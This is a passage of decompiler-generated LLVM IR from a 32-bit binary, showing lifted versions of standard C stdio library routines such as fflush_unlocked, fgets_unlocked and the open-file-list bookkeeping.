  %v1_80519e4 = load i32, i32* @esi, align 4
  %v2_80519e4 = add i32 %v1_80519e4, 16
  %v3_80519e4 = inttoptr i32 %v2_80519e4 to i32*
  store i32 %v1_80519e3, i32* %v3_80519e4, align 4
  br label %dec_label_pc_8051a49

dec_label_pc_80519e9:                             ; preds = %dec_label_pc_80519d4
  %v4_80519ed = call i32 @putc_unlocked(i8 %arg1, i32 %arg2)
  store i32 %v4_80519ed, i32* %eax.global-to-local, align 4
  store i32 %v4_80519ed, i32* @ebx, align 4
  br label %dec_label_pc_8051a46

dec_label_pc_80519f6:                             ; preds = %entry
  %v1_80519f6 = add i32 %arg2, 56
  store i32 %v1_80519f6, i32* @ebx, align 4
  store i32 %v12_80519c3, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v12_80519c3, 16777216
  %v1_8051a05 = sdiv i32 %sext, 16777216
  %v4_8051a05 = inttoptr i32 %v1_8051a05 to i32*
  %v5_8051a05 = call i32 @__pthread_cleanup_push_defer(i32* %v4_8051a05, i32 134541533, i32 %v1_80519f6)
  store i32 %v5_8051a05, i32* %eax.global-to-local, align 4
  %v0_8051a0a = load i32, i32* @ebx, align 4
  %sext1 = mul i32 %v0_8051a0a, 16777216
  %v1_8051a0d = sdiv i32 %sext1, 16777216
  %v2_8051a0d = call i32 @pthread_mutex_lock(i32 %v1_8051a0d)
  store i32 %v2_8051a0d, i32* %eax.global-to-local, align 4
  %v0_8051a12 = load i32, i32* @esi, align 4
  %v1_8051a12 = add i32 %v0_8051a12, 16
  %v2_8051a12 = inttoptr i32 %v1_8051a12 to i32*
  %v3_8051a12 = load i32, i32* %v2_8051a12, align 4
  store i32 %v3_8051a12, i32* %eax.global-to-local, align 4
  %v2_8051a18 = add i32 %v0_8051a12, 28
  %v3_8051a18 = inttoptr i32 %v2_8051a18 to i32*
  %v4_8051a18 = load i32, i32* %v3_8051a18, align 4
  %v10_8051a18 = icmp ult i32 %v3_8051a12, %v4_8051a18
  %v1_8051a1b = icmp eq i1 %v10_8051a18, false
  %v0_8051a2d = load i32, i32* @edi, align 4
  br i1 %v1_8051a1b, label %dec_label_pc_8051a2a, label %dec_label_pc_8051a1d

dec_label_pc_8051a1d:                             ; preds = %dec_label_pc_80519f6
  store i32 %v0_8051a2d, i32* %edx.global-to-local, align 4
  %v1_8051a1f = trunc i32 %v0_8051a2d to i8
  %v3_8051a1f = inttoptr i32 %v3_8051a12 to i8*
  store i8 %v1_8051a1f, i8* %v3_8051a1f, align 1
  %v0_8051a21 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a21 = urem i32 %v0_8051a21, 256
  store i32 %v1_8051a21, i32* @ebx, align 4
  %v0_8051a24 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a24 = add i32 %v0_8051a24, 1
  store i32 %v1_8051a24, i32* %eax.global-to-local, align 4
  %v1_8051a25 = load i32, i32* @esi, align 4
  %v2_8051a25 = add i32 %v1_8051a25, 16
  %v3_8051a25 = inttoptr i32 %v2_8051a25 to i32*
  store i32 %v1_8051a24, i32* %v3_8051a25, align 4
  br label %dec_label_pc_8051a38

dec_label_pc_8051a2a:                             ; preds = %dec_label_pc_80519f6
  %v5_8051a2d = trunc i32 %v0_8051a2d to i8
  %v4_8051a2e = call i32 @putc_unlocked(i8 %v5_8051a2d, i32 %v0_8051a12)
  store i32 %v4_8051a2e, i32* %eax.global-to-local, align 4
  store i32 %v4_8051a2e, i32* @ebx, align 4
  br label %dec_label_pc_8051a38

dec_label_pc_8051a38:                             ; preds = %dec_label_pc_8051a1d, %dec_label_pc_8051a2a
  store i32 %v12_80519c3, i32* %eax.global-to-local, align 4
  %v4_8051a41 = call i32 @__pthread_cleanup_pop_restore(i32* %v4_8051a05, i32 1)
  store i32 %v4_8051a41, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051a46

dec_label_pc_8051a46:                             ; preds = %dec_label_pc_80519e9, %dec_label_pc_8051a38
  br label %dec_label_pc_8051a49

dec_label_pc_8051a49:                             ; preds = %dec_label_pc_80519dc, %dec_label_pc_8051a46
  %v0_8051a4c = load i32, i32* @ebx, align 4
  store i32 %v0_8051a4c, i32* %eax.global-to-local, align 4
  store i32 %v0_80519c2, i32* @ebx, align 4
  store i32 %v0_80519c1, i32* @esi, align 4
  store i32 %v0_80519c0, i32* @edi, align 4
  ret i32 %v0_8051a4c

; uselistorder directives
  uselistorder i32 %v0_8051a2d, { 2, 1, 0 }
  uselistorder i32 %v12_80519c3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_8051a49, { 1, 0 }
  uselistorder label %dec_label_pc_8051a46, { 1, 0 }
  uselistorder label %dec_label_pc_8051a38, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v6_8051a68 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134541533, i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  %v2_8051a74 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  %v0_8051a79 = load i32, i32* @global_var_806541c.204, align 4
  %v8_8051a81 = icmp eq i32 %v0_8051a79, 1
  %v1_8051a82 = icmp eq i1 %v8_8051a81, false
  br i1 %v1_8051a82, label %dec_label_pc_8051b19, label %dec_label_pc_8051a88

dec_label_pc_8051a88:                             ; preds = %entry
  %v0_8051a88 = load i32, i32* @global_var_8065420.205, align 32
  %tmp30 = icmp slt i32 %v0_8051a88, 1
  br i1 %tmp30, label %dec_label_pc_8051b19, label %dec_label_pc_8051a95

dec_label_pc_8051a95:                             ; preds = %dec_label_pc_8051a88
  store i32 0, i32* @esi, align 4
  %v6_8051aa7 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 134541533, i32 ptrtoint (i32* @global_var_8062b80.211 to i32))
  %v2_8051ab3 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062b80.211 to i32))
  %v0_8051ab8 = load i32, i32* bitcast (i32** @global_var_8062b7c.185 to i32*), align 4
  store i32 %v0_8051ab8, i32* %edx.global-to-local, align 4
  %v1_8051afa5 = icmp eq i32 %v0_8051ab8, 0
  %v1_8051afc12 = icmp eq i1 %v1_8051afa5, false
  br i1 %v1_8051afc12, label %dec_label_pc_8051ac3, label %dec_label_pc_8051afe

dec_label_pc_8051ac3:                             ; preds = %dec_label_pc_8051a95, %dec_label_pc_8051af8
  %v1_8051ac316.in = phi i32 [ %v0_8051af8, %dec_label_pc_8051af8 ], [ %v0_8051ab8, %dec_label_pc_8051a95 ]
  %v1_8051ac316 = inttoptr i32 %v1_8051ac316.in to i16*
  %v2_8051ac3 = load i16, i16* %v1_8051ac316, align 2
  %v1_8051ac6 = add i32 %v1_8051ac316.in, 32
  %v2_8051ac6 = inttoptr i32 %v1_8051ac6 to i32*
  %v3_8051ac6 = load i32, i32* %v2_8051ac6, align 4
  store i32 %v3_8051ac6, i32* @ebx, align 4
  %v1_8051ac9 = and i16 %v2_8051ac3, -32720
  %v6_8051ace = icmp eq i16 %v1_8051ac9, 48
  br i1 %v6_8051ace, label %dec_label_pc_8051ad7, label %dec_label_pc_8051ad3

dec_label_pc_8051ad3:                             ; preds = %dec_label_pc_8051ac3
  store i32 %v1_8051ac316.in, i32* @esi, align 4
  br label %dec_label_pc_8051af8

dec_label_pc_8051ad7:                             ; preds = %dec_label_pc_8051ac3
  %v0_8051ad7 = load i32, i32* @esi, align 4
  %v1_8051ad7 = icmp eq i32 %v0_8051ad7, 0
  %v1_8051ad9 = icmp eq i1 %v1_8051ad7, false
  br i1 %v1_8051ad9, label %dec_label_pc_8051ae3, label %dec_label_pc_8051adb

dec_label_pc_8051adb:                             ; preds = %dec_label_pc_8051ad7
  store i32 %v3_8051ac6, i32* bitcast (i32** @global_var_8062b7c.185 to i32*), align 4
  br label %dec_label_pc_8051ae6

dec_label_pc_8051ae3:                             ; preds = %dec_label_pc_8051ad7
  %v2_8051ae3 = add i32 %v0_8051ad7, 32
  %v3_8051ae3 = inttoptr i32 %v2_8051ae3 to i32*
  store i32 %v3_8051ac6, i32* %v3_8051ae3, align 4
  %v0_8051ae6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051ae6

dec_label_pc_8051ae6:                             ; preds = %dec_label_pc_8051adb, %dec_label_pc_8051ae3
  %v0_8051aef = phi i32 [ %v1_8051ac316.in, %dec_label_pc_8051adb ], [ %v0_8051ae6.pre, %dec_label_pc_8051ae3 ]
  %v1_8051ae6 = add i32 %v0_8051aef, 1
  %v2_8051ae6 = inttoptr i32 %v1_8051ae6 to i8*
  %v3_8051ae6 = load i8, i8* %v2_8051ae6, align 1
  %v4_8051ae6 = and i8 %v3_8051ae6, 32
  %v5_8051ae6 = icmp eq i8 %v4_8051ae6, 0
  br i1 %v5_8051ae6, label %dec_label_pc_8051af8, label %dec_label_pc_8051aec

dec_label_pc_8051aec:                             ; preds = %dec_label_pc_8051ae6
  %v2_8051af0 = call i32 @free(i32 %v0_8051aef)
  br label %dec_label_pc_8051af8

dec_label_pc_8051af8:                             ; preds = %dec_label_pc_8051ae6, %dec_label_pc_8051ad3, %dec_label_pc_8051aec
  %v0_8051af8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051af8, i32* %edx.global-to-local, align 4
  %v1_8051afa = icmp eq i32 %v0_8051af8, 0
  %v1_8051afc = icmp eq i1 %v1_8051afa, false
  br i1 %v1_8051afc, label %dec_label_pc_8051ac3, label %dec_label_pc_8051afe

dec_label_pc_8051afe:                             ; preds = %dec_label_pc_8051af8, %dec_label_pc_8051a95
  %v4_8051b07 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 0, i32* @global_var_8065420.205, align 32
  %v0_8051b19.pre = load i32, i32* @global_var_806541c.204, align 4
  br label %dec_label_pc_8051b19

dec_label_pc_8051b19:                             ; preds = %dec_label_pc_8051a88, %entry, %dec_label_pc_8051afe
  %v0_8051b19 = phi i32 [ %v0_8051a79, %dec_label_pc_8051a88 ], [ %v0_8051a79, %entry ], [ %v0_8051b19.pre, %dec_label_pc_8051afe ]
  %v1_8051b1e = add i32 %v0_8051b19, -1
  store i32 %v1_8051b1e, i32* @global_var_806541c.204, align 4
  %v4_8051b2d = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 %v4_8051b2d

; uselistorder directives
  uselistorder i32 %v0_8051af8, { 1, 2, 0 }
  uselistorder i32 %v1_8051ac316.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8051a79, { 1, 2, 0 }
  uselistorder i32* bitcast (i32** @global_var_8062b7c.185 to i32*), { 4, 5, 0, 1, 6, 7, 2, 3 }
  uselistorder label %dec_label_pc_8051b19, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051af8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ae6, { 1, 0 }
  uselistorder label %dec_label_pc_8051ac3, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8051b38 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_8051b3b = load i32, i32* @edi, align 4
  %v0_8051b3c = load i32, i32* @esi, align 4
  %v0_8051b3d = load i32, i32* @ebx, align 4
  %v4_8051b41 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051b41, i32* @ebx, align 4
  %v10_8051b45 = icmp eq i16* %arg1, inttoptr (i32 134622076 to i16*)
  br i1 %v10_8051b45, label %dec_label_pc_8051b59, label %dec_label_pc_8051b4d

dec_label_pc_8051b4d:                             ; preds = %entry
  %v2_8051b4d = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_8051b53 = icmp eq i1 %v2_8051b4d, false
  br i1 %v1_8051b53, label %dec_label_pc_8051c51, label %dec_label_pc_8051b59

dec_label_pc_8051b59:                             ; preds = %dec_label_pc_8051b4d, %entry
  store i32 0, i32* @edi, align 4
  %v2_8051b66 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051b66, i32* @ebx, align 4
  %v5_8051b6b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  %v2_8051b77 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  %v0_8051b7c = load i32, i32* @global_var_806541c.204, align 4
  store i32 ptrtoint (i32* @global_var_8062b98.203 to i32), i32* @ecx, align 4
  %v1_8051b83 = add i32 %v0_8051b7c, 1
  store i32 %v1_8051b83, i32* @global_var_806541c.204, align 4
  %v4_8051b8c = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v5_8051b9f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8062b80.211 to i32))
  %v2_8051bab = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062b80.211 to i32))
  %v4_8051bbb = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_8051c422 = load i32, i32* @esi, align 4
  %v1_8051c423 = icmp eq i32 %v0_8051c422, 0
  %v1_8051c4410 = icmp eq i1 %v1_8051c423, false
  br i1 %v1_8051c4410, label %dec_label_pc_8051bc5, label %dec_label_pc_8051c4a

dec_label_pc_8051bc5:                             ; preds = %dec_label_pc_8051b59, %dec_label_pc_8051c3f
  %v0_8051bd3 = phi i32 [ %v3_8051c3f, %dec_label_pc_8051c3f ], [ %v0_8051c422, %dec_label_pc_8051b59 ]
  %v1_8051bc5 = inttoptr i32 %v0_8051bd3 to i8*
  %v2_8051bc5 = load i8, i8* %v1_8051bc5, align 1
  %v3_8051bc5 = and i8 %v2_8051bc5, 64
  %v4_8051bc5 = icmp eq i8 %v3_8051bc5, 0
  br i1 %v4_8051bc5, label %dec_label_pc_8051c3f, label %dec_label_pc_8051bca

dec_label_pc_8051bca:                             ; preds = %dec_label_pc_8051bc5
  %v0_8051bca = load i32, i32* @global_var_8062bb0.182, align 16
  %v9_8051bca = icmp eq i32 %v0_8051bca, 2
  br i1 %v9_8051bca, label %dec_label_pc_8051bf2, label %dec_label_pc_8051bd3

dec_label_pc_8051bd3:                             ; preds = %dec_label_pc_8051bca
  %v1_8051bd3 = add i32 %v0_8051bd3, 56
  store i32 %v1_8051bd3, i32* @ebx, align 4
  %v5_8051be2 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 %v1_8051bd3)
  %v0_8051be7 = load i32, i32* @ebx, align 4
  %v2_8051bea = call i32 @pthread_mutex_lock(i32 %v0_8051be7)
  %v0_8051bf2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051bf2

dec_label_pc_8051bf2:                             ; preds = %dec_label_pc_8051bca, %dec_label_pc_8051bd3
  %v0_8051c05 = phi i32 [ %v0_8051bd3, %dec_label_pc_8051bca ], [ %v0_8051bf2.pre, %dec_label_pc_8051bd3 ]
  %v1_8051bf2 = inttoptr i32 %v0_8051c05 to i32*
  %v2_8051bf2 = load i32, i32* %v1_8051bf2, align 4
  %v1_8051bf4 = load i32, i32* @ebp, align 4
  %v2_8051bf4 = or i32 %v1_8051bf4, %v2_8051bf2
  %v1_8051bf6 = and i32 %v2_8051bf4, 832
  %v2_8051bfb = icmp eq i32 %v1_8051bf6, 320
  %v1_8051c00 = icmp eq i1 %v2_8051bfb, false
  br i1 %v1_8051c00, label %dec_label_pc_8051c25, label %dec_label_pc_8051c02

dec_label_pc_8051c02:                             ; preds = %dec_label_pc_8051bf2
  %v2_8051c06 = call i32 @__stdio_wcommit(i32 %v0_8051c05)
  %v1_8051c0e = icmp eq i32 %v2_8051c06, 0
  br i1 %v1_8051c0e, label %dec_label_pc_8051c17, label %dec_label_pc_8051c12

dec_label_pc_8051c12:                             ; preds = %dec_label_pc_8051c02
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8051c25

dec_label_pc_8051c17:                             ; preds = %dec_label_pc_8051c02
  %v0_8051c17 = load i32, i32* @esi, align 4
  %v1_8051c17 = add i32 %v0_8051c17, 8
  %v2_8051c17 = inttoptr i32 %v1_8051c17 to i32*
  %v3_8051c17 = load i32, i32* %v2_8051c17, align 4
  %v2_8051c1a = add i32 %v0_8051c17, 28
  %v3_8051c1a = inttoptr i32 %v2_8051c1a to i32*
  store i32 %v3_8051c17, i32* %v3_8051c1a, align 4
  %v0_8051c1d = load i32, i32* @esi, align 4
  %v1_8051c1d = inttoptr i32 %v0_8051c1d to i32*
  %v2_8051c1d = load i32, i32* %v1_8051c1d, align 4
  %v2_8051c1d.tr = trunc i32 %v2_8051c1d to i16
  %v1_8051c22 = and i16 %v2_8051c1d.tr, -65
  %v3_8051c22 = inttoptr i32 %v0_8051c1d to i16*
  store i16 %v1_8051c22, i16* %v3_8051c22, align 2
  br label %dec_label_pc_8051c25

dec_label_pc_8051c25:                             ; preds = %dec_label_pc_8051bf2, %dec_label_pc_8051c12, %dec_label_pc_8051c17
  %v0_8051c25 = load i32, i32* @global_var_8062bb0.182, align 16
  %v9_8051c25 = icmp eq i32 %v0_8051c25, 2
  br i1 %v9_8051c25, label %dec_label_pc_8051c3f, label %dec_label_pc_8051c2e

dec_label_pc_8051c2e:                             ; preds = %dec_label_pc_8051c25
  %v4_8051c37 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_8051c3f

dec_label_pc_8051c3f:                             ; preds = %dec_label_pc_8051c25, %dec_label_pc_8051bc5, %dec_label_pc_8051c2e
  %v0_8051c3f = load i32, i32* @esi, align 4
  %v1_8051c3f = add i32 %v0_8051c3f, 32
  %v2_8051c3f = inttoptr i32 %v1_8051c3f to i32*
  %v3_8051c3f = load i32, i32* %v2_8051c3f, align 4
  store i32 %v3_8051c3f, i32* @esi, align 4
  %v1_8051c42 = icmp eq i32 %v3_8051c3f, 0
  %v1_8051c44 = icmp eq i1 %v1_8051c42, false
  br i1 %v1_8051c44, label %dec_label_pc_8051bc5, label %dec_label_pc_8051c4a

dec_label_pc_8051c4a:                             ; preds = %dec_label_pc_8051c3f, %dec_label_pc_8051b59
  %v0_8051c4a = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_8051c7b

dec_label_pc_8051c51:                             ; preds = %dec_label_pc_8051b4d
  store i32 0, i32* @edi, align 4
  %tmp26 = bitcast i16* %arg1 to i8*
  %v3_8051c53 = load i8, i8* %tmp26, align 1
  %v4_8051c53 = and i8 %v3_8051c53, 64
  %v5_8051c53 = icmp eq i8 %v4_8051c53, 0
  br i1 %v5_8051c53, label %dec_label_pc_8051c7b, label %dec_label_pc_8051c58

dec_label_pc_8051c58:                             ; preds = %dec_label_pc_8051c51
  store i32 -1, i32* @edi, align 4
  %v2_8051c5f = call i32 @__stdio_wcommit(i32 %v4_8051b41)
  %v1_8051c67 = icmp eq i32 %v2_8051c5f, 0
  %v1_8051c69 = icmp eq i1 %v1_8051c67, false
  br i1 %v1_8051c69, label %dec_label_pc_8051c7b, label %dec_label_pc_8051c6b

dec_label_pc_8051c6b:                             ; preds = %dec_label_pc_8051c58
  %v2_8051c6b = add i32 %v4_8051b41, 8
  %v3_8051c6b = inttoptr i32 %v2_8051c6b to i32*
  %v4_8051c6b = load i32, i32* %v3_8051c6b, align 4
  store i32 0, i32* @edi, align 4
  %v3_8051c70 = add i32 %v4_8051b41, 28
  %v4_8051c70 = inttoptr i32 %v3_8051c70 to i32*
  store i32 %v4_8051c6b, i32* %v4_8051c70, align 4
  %tmp28 = bitcast i16* %arg1 to i32*
  %v3_8051c73 = load i32, i32* %tmp28, align 4
  %v3_8051c73.tr = trunc i32 %v3_8051c73 to i16
  %v1_8051c78 = and i16 %v3_8051c73.tr, -65
  store i16 %v1_8051c78, i16* %arg1, align 2
  br label %dec_label_pc_8051c7b

dec_label_pc_8051c7b:                             ; preds = %dec_label_pc_8051c58, %dec_label_pc_8051c51, %dec_label_pc_8051c4a, %dec_label_pc_8051c6b
  %v0_8051c7e = load i32, i32* @edi, align 4
  store i32 %v0_8051b3d, i32* @ebx, align 4
  store i32 %v0_8051b3c, i32* @esi, align 4
  store i32 %v0_8051b3b, i32* @edi, align 4
  store i32 %v0_8051b38, i32* @ebp, align 4
  ret i32 %v0_8051c7e

; uselistorder directives
  uselistorder i32 %v3_8051c3f, { 1, 2, 0 }
  uselistorder i32 %v4_8051b41, { 1, 2, 0, 3 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8062b80.211 to i32), { 3, 2, 4, 0, 5, 6, 7, 1 }
  uselistorder i32* @global_var_806541c.204, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8062b98.203 to i32), { 0, 6, 1, 7, 2, 8, 9, 12, 3, 10, 5, 11, 4 }
  uselistorder i16* %arg1, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8051c7b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051c3f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051c25, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051bf2, { 1, 0 }
  uselistorder label %dec_label_pc_8051bc5, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8051c88 = load i32, i32* @ebp, align 4
  %v0_8051c89 = load i32, i32* @edi, align 4
  %v4_8051c93 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c93, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8051c93, i32* @ebx, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8051cd9.preheader, label %dec_label_pc_8051ce5

dec_label_pc_8051cd9.preheader:                   ; preds = %entry
  %v1_8051cd918 = add i32 %arg2, -1
  %v8_8051cd922 = icmp eq i32 %v1_8051cd918, 0
  store i32 %v1_8051cd918, i32* @esi, align 4
  %v1_8051cda24 = icmp eq i1 %v8_8051cd922, false
  br i1 %v1_8051cda24, label %dec_label_pc_8051ca3, label %dec_label_pc_8051cdc

dec_label_pc_8051ca3:                             ; preds = %dec_label_pc_8051cd9.preheader, %dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge.dec_label_pc_8051ca3_crit_edge
  %v0_8051ca3 = phi i32 [ %v0_8051ca3.pre, %dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge.dec_label_pc_8051ca3_crit_edge ], [ %arg3, %dec_label_pc_8051cd9.preheader ]
  %v1_8051ca3 = add i32 %v0_8051ca3, 16
  %v2_8051ca3 = inttoptr i32 %v1_8051ca3 to i32*
  %v3_8051ca3 = load i32, i32* %v2_8051ca3, align 4
  store i32 %v3_8051ca3, i32* %eax.global-to-local, align 4
  %v2_8051ca6 = add i32 %v0_8051ca3, 24
  %v3_8051ca6 = inttoptr i32 %v2_8051ca6 to i32*
  %v4_8051ca6 = load i32, i32* %v3_8051ca6, align 4
  %v10_8051ca6 = icmp ult i32 %v3_8051ca3, %v4_8051ca6
  %v1_8051ca9 = icmp eq i1 %v10_8051ca6, false
  br i1 %v1_8051ca9, label %dec_label_pc_8051cb9, label %dec_label_pc_8051cab

dec_label_pc_8051cab:                             ; preds = %dec_label_pc_8051ca3
  %v1_8051cab = inttoptr i32 %v3_8051ca3 to i8*
  %v2_8051cab = load i8, i8* %v1_8051cab, align 1
  %v3_8051cab = zext i8 %v2_8051cab to i32
  %v4_8051cab = load i32, i32* @edx, align 4
  %v5_8051cab = and i32 %v4_8051cab, -256
  %v6_8051cab = or i32 %v5_8051cab, %v3_8051cab
  store i32 %v6_8051cab, i32* @edx, align 4
  %v1_8051cad = add i32 %v3_8051ca3, 1
  store i32 %v1_8051cad, i32* %eax.global-to-local, align 4
  %v2_8051cae = load i32, i32* @ebx, align 4
  %v3_8051cae = inttoptr i32 %v2_8051cae to i8*
  store i8 %v2_8051cab, i8* %v3_8051cae, align 1
  %v0_8051cb0 = load i32, i32* @ebx, align 4
  %v1_8051cb0 = add i32 %v0_8051cb0, 1
  store i32 %v1_8051cb0, i32* @ebx, align 4
  %v0_8051cb1 = load i32, i32* @edx, align 4
  %v1_8051cb1 = trunc i32 %v0_8051cb1 to i8
  %v10_8051cb1 = icmp eq i8 %v1_8051cb1, 10
  %v0_8051cb4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cb4 = load i32, i32* @ebp, align 4
  %v2_8051cb4 = add i32 %v1_8051cb4, 16
  %v3_8051cb4 = inttoptr i32 %v2_8051cb4 to i32*
  store i32 %v0_8051cb4, i32* %v3_8051cb4, align 4
  br i1 %v10_8051cb1, label %dec_label_pc_8051cdc, label %dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge

dec_label_pc_8051cb9:                             ; preds = %dec_label_pc_8051ca3
  %v0_8051cbd = call i32 @getc_unlocked()
  %v1_8051cbd = trunc i32 %v0_8051cbd to i8
  store i32 %v0_8051cbd, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_8051cbd, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8051cc8 = icmp eq i1 %tmp, false
  br i1 %v1_8051cc8, label %dec_label_pc_8051cd7, label %dec_label_pc_8051cca

dec_label_pc_8051cca:                             ; preds = %dec_label_pc_8051cb9
  %v0_8051cca = load i32, i32* @ebp, align 4
  %v1_8051cca = inttoptr i32 %v0_8051cca to i8*
  %v2_8051cca = load i8, i8* %v1_8051cca, align 1
  %v3_8051cca = and i8 %v2_8051cca, 8
  %v4_8051cca = icmp eq i8 %v3_8051cca, 0
  br i1 %v4_8051cca, label %dec_label_pc_8051cdc, label %dec_label_pc_8051ce5

dec_label_pc_8051cd7:                             ; preds = %dec_label_pc_8051cb9
  %v3_8051cd2 = load i32, i32* @ebx, align 4
  %v4_8051cd2 = inttoptr i32 %v3_8051cd2 to i8*
  store i8 %v1_8051cbd, i8* %v4_8051cd2, align 1
  %v0_8051cd4 = load i32, i32* @ebx, align 4
  %v1_8051cd4 = add i32 %v0_8051cd4, 1
  store i32 %v1_8051cd4, i32* @ebx, align 4
  %v11_8051cd5 = icmp eq i8 %v1_8051cbd, 10
  br i1 %v11_8051cd5, label %dec_label_pc_8051cdc, label %dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge

dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge: ; preds = %dec_label_pc_8051cab, %dec_label_pc_8051cd7
  %v0_8051cd9.pre = load i32, i32* @esi, align 4
  %v1_8051cd9 = add i32 %v0_8051cd9.pre, -1
  %v8_8051cd9 = icmp eq i32 %v1_8051cd9, 0
  store i32 %v1_8051cd9, i32* @esi, align 4
  %v1_8051cda = icmp eq i1 %v8_8051cd9, false
  br i1 %v1_8051cda, label %dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge.dec_label_pc_8051ca3_crit_edge, label %dec_label_pc_8051cdc

dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge.dec_label_pc_8051ca3_crit_edge: ; preds = %dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge
  %v0_8051ca3.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051ca3

dec_label_pc_8051cdc:                             ; preds = %dec_label_pc_8051cd9.preheader, %dec_label_pc_8051cab, %dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge, %dec_label_pc_8051cd7, %dec_label_pc_8051cca
  %v0_8051cdc = load i32, i32* @ebx, align 4
  %v1_8051cdc = load i32, i32* @edi, align 4
  %tmp26 = icmp ugt i32 %v0_8051cdc, %v1_8051cdc
  br i1 %tmp26, label %dec_label_pc_8051ce0, label %dec_label_pc_8051ce5

dec_label_pc_8051ce0:                             ; preds = %dec_label_pc_8051cdc
  %v1_8051ce0 = inttoptr i32 %v0_8051cdc to i8*
  store i8 0, i8* %v1_8051ce0, align 1
  %v0_8051cea.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051ce7

dec_label_pc_8051ce5:                             ; preds = %dec_label_pc_8051cdc, %dec_label_pc_8051cca, %entry
  br label %dec_label_pc_8051ce7

dec_label_pc_8051ce7:                             ; preds = %dec_label_pc_8051ce0, %dec_label_pc_8051ce5
  %v0_8051cea = phi i32 [ %v0_8051cea.pre, %dec_label_pc_8051ce0 ], [ 0, %dec_label_pc_8051ce5 ]
  store i32 %v0_8051cea, i32* %eax.global-to-local, align 4
  store i32 %v0_8051c89, i32* @edi, align 4
  store i32 %v0_8051c88, i32* @ebp, align 4
  ret i32 %v0_8051cea

; uselistorder directives
  uselistorder i32 %v0_8051cea, { 1, 0 }
  uselistorder i32 %v0_8051cdc, { 1, 0 }
  uselistorder i32 %v1_8051cd9, { 1, 0 }
  uselistorder i32 %v0_8051cbd, { 0, 2, 1 }
  uselistorder i32 %v0_8051ca3, { 1, 0 }
  uselistorder label %dec_label_pc_8051ce7, { 1, 0 }
  uselistorder label %dec_label_pc_8051cdc, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8051cd7.dec_label_pc_8051cd9_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051ca3, { 1, 0 }
}

